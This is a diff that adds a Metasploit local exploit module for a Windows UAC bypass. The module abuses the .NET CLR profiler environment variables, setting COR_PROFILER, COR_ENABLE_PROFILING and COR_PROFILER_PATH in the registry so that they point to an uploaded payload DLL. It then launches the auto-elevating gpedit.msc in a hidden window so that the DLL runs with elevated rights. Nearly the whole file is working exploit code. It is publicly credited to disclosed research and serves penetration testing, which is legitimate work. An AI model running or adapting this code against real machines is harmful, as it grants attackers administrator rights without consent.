@@ -1,0 +1,210 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+  include Post::Windows::Priv
+  include Post::Windows::Runas
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'          => 'Windows Escalate UAC Protection Bypass (Via dot net profiler)',
+      'Description'   => %q(
+      Microsoft Windows allows for the automatic loading of a profiling COM object during
+      the launch of a CLR process based on certain environment variables ostensibly to
+      monitor execution.  In this case, we abuse the profiler by pointing to a payload DLL
+      that will be launched as the profiling thread.  This thread will run at the permission
+      level of the calling process, so an auto-elevating process will launch the DLL with
+      elevated permissions.  In this case, we use gpedit.msc as the auto-elevated CLR
+      process, but others would work, too.
+      ),
+      'License'       => MSF_LICENSE,
+      'Author'        => [
+          'Casey Smith',   # UAC bypass discovery and research
+          '"Stefan Kanthak" <stefan.kanthak () nexgo de>',   # UAC bypass discovery and research
+          'bwatters-r7', # Module
+        ],
+      'Platform'      => ['win'],
+      'SessionTypes'  => ['meterpreter'],
+      'Targets'       => [
+          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]
+      ],
+      'DefaultTarget' => 0,
+      'Notes'         =>
+        {
+          'SideEffects' => [ ARTIFACTS_ON_DISK ]
+        },
+      'References'    =>
+        [
+          ['URL', 'https://seclists.org/fulldisclosure/2017/Jul/11'],
+          ['URL', 'https://offsec.provadys.com/UAC-bypass-dotnet.html']
+        ],
+      'DisclosureDate' => 'Mar 17 2017'
+      )
+    )
+    register_options(
+      [OptString.new('PAYLOAD_NAME', [false, 'The filename to use for the payload binary (%RAND% by default).', nil])]
+    )
+
+  end
+
+  def check
+    if sysinfo['OS'] =~ /Windows (7|8|2008|2012|10)/ && is_uac_enabled?
+      Exploit::CheckCode::Appears
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def write_reg_value(registry_hash)
+    vprint_status("Writing #{registry_hash[:value_name]} to #{registry_hash[:key_name]}")
+    begin
+      if not registry_key_exist?(registry_hash[:key_name])
+        registry_createkey(registry_hash[:key_name])
+        registry_hash[:delete_on_cleanup] = true
+      else
+        registry_hash[:delete_on_cleanup] = false
+      end
+      registry_setvaldata(registry_hash[:key_name], \
+                          registry_hash[:value_name], \
+                          registry_hash[:value_value], \
+                          registry_hash[:value_type])
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error(e.to_s)
+    end
+  end
+
+  def remove_reg_value(registry_hash)
+    # we may have already deleted the key
+    return unless registry_key_exist?(registry_hash[:key_name])
+    begin
+      if registry_hash[:delete_on_cleanup]
+        vprint_status("Deleting #{registry_hash[:key_name]} key")
+        registry_deletekey(registry_hash[:key_name])
+      else
+        vprint_status("Deleting #{registry_hash[:value_name]} from #{registry_hash[:key_name]} key")
+        registry_deleteval(registry_hash[:key_name], registry_hash[:value_name])
+      end
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_bad("Unable to clean up registry")
+      print_error(e.to_s)
+    end
+  end
+
+  def exploit
+    check_permissions!
+    case get_uac_level
+    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
+      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
+      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
+      fail_with(Failure::NotVulnerable,
+                "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...")
+    when UAC_DEFAULT
+      print_good('UAC is set to Default')
+      print_good('BypassUAC can bypass this setting, continuing...')
+    when UAC_NO_PROMPT
+      print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
+      shell_execute_exe
+      return
+    end
+
+    # get directory locations straight
+    win_dir = session.sys.config.getenv('windir')
+    vprint_status("win_dir = " + win_dir)
+    tmp_dir = session.sys.config.getenv('tmp')
+    vprint_status("tmp_dir = " + tmp_dir)
+    exploit_dir = win_dir + "\\System32\\"
+    vprint_status("exploit_dir = " + exploit_dir)
+    target_filepath = exploit_dir + "gpedit.msc"
+    vprint_status("target_filepath = " + target_filepath)
+    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6)) + '.dll'
+    payload_pathname = tmp_dir + '\\' + payload_name
+
+    # make payload
+    vprint_status("Making Payload")
+    vprint_status("payload_pathname = " + payload_pathname)
+    payload = generate_payload_dll
+
+    uuid = SecureRandom.uuid
+    vprint_status("UUID = #{uuid}")
+    reg_keys = []
+    # This reg key will not hurt anything in windows 10+, but is not required.
+    unless sysinfo['OS'] =~ /Windows (2016|10)/
+      reg_keys.push(key_name: "HKCU\\Software\\Classes\\CLSID\\{#{uuid}}\\InprocServer32",
+                    value_name: '',
+                    value_type: "REG_EXPAND_SZ",
+                    value_value: payload_pathname,
+                    delete_on_cleanup: false)
+    end
+    reg_keys.push(key_name: "HKCU\\Environment",
+                  value_name: "COR_PROFILER",
+                  value_type: "REG_SZ",
+                  value_value: "{#{uuid}}",
+                  delete_on_cleanup: false)
+    reg_keys.push(key_name: "HKCU\\Environment",
+                  value_name: "COR_ENABLE_PROFILING",
+                  value_type: "REG_SZ",
+                  value_value: "1",
+                  delete_on_cleanup: false)
+    reg_keys.push(key_name: "HKCU\\Environment",
+                  value_name: "COR_PROFILER_PATH",
+                  value_type: "REG_SZ",
+                  value_value: payload_pathname,
+                  delete_on_cleanup: false)
+    reg_keys.each do |key_hash|
+      write_reg_value(key_hash)
+    end
+
+    # Upload payload
+    vprint_status("Uploading Payload to #{payload_pathname}")
+    write_file(payload_pathname, payload)
+    vprint_status("Payload Upload Complete")
+
+    vprint_status("Launching " + target_filepath)
+    begin
+      session.sys.process.execute("cmd.exe /c \"#{target_filepath}\"", nil, 'Hidden' => true)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error(e.to_s)
+    end
+    print_warning("This exploit requires manual cleanup of '#{payload_pathname}!")
+    # wait for a few seconds before cleaning up
+    print_status("Please wait for session and cleanup....")
+    sleep(20)
+    vprint_status("Removing Registry Changes")
+    reg_keys.each do |key_hash|
+      remove_reg_value(key_hash)
+    end
+    vprint_status("Registry Changes Removed")
+  end
+
+  def check_permissions!
+    unless check == Exploit::CheckCode::Appears
+      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
+    end
+    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?
+    # Check if you are an admin
+    # is_in_admin_group can be nil, true, or false
+    print_status('UAC is Enabled, checking level...')
+    vprint_status('Checking admin status...')
+    admin_group = is_in_admin_group?
+    if admin_group.nil?
+      print_error('Either whoami is not there or failed to execute')
+      print_error('Continuing under assumption you already checked...')
+    else
+      if admin_group
+        print_good('Part of Administrators group! Continuing...')
+      else
+        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
+      end
+    end
+
+    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
+      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
+    end
+  end
+end
